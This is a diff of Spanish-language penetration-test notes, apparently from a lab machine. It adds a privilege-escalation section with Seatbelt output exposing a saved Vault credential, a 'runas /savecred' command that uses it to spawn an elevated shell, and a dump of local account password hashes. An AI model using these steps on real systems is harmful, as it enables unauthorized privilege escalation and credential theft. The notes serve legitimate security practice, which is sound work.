@@ -53,3 +53,24 @@ Tambien un email con un dominio que no conociamos
 hello@TBHSecurity.com
 ```
 To do: Avergiguar la localizacion de la compañia
+
+## Privesc
+De manera transversal a la enumeracion encontramos el hash de un usuario de este equipo si nos conectamos y pasamos el binario de Seatbelt podremos ver que hay un usuario con las credenciales en el Vault
+```
+====== CredEnum ======                                                                                                                                                                                                                                                                                                                                                                                                                                                                      Target              : localadmin.pass                                                                                                                                                                                                        UserName            : admin-petersj                                                                                                                                                                                                          Password            :                                                                                                                                                                                                                        CredentialType      : DomainPassword                                                                                                                                                                                                         PersistenceType     : Enterprise                                                                                                                                                                                                             LastWriteTime       : 8/25/2020 2:52:57 AM    
+```
+Podremos elevar privilegios haciendo lo siguiente
+```
+runas /savecred /user:admin-petersj /profile "cmd.exe"
+```
+## Post-explotaion
+### PowerDump
+```
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+sshd:1009:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+admin-petersj:1010:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+```
+### 
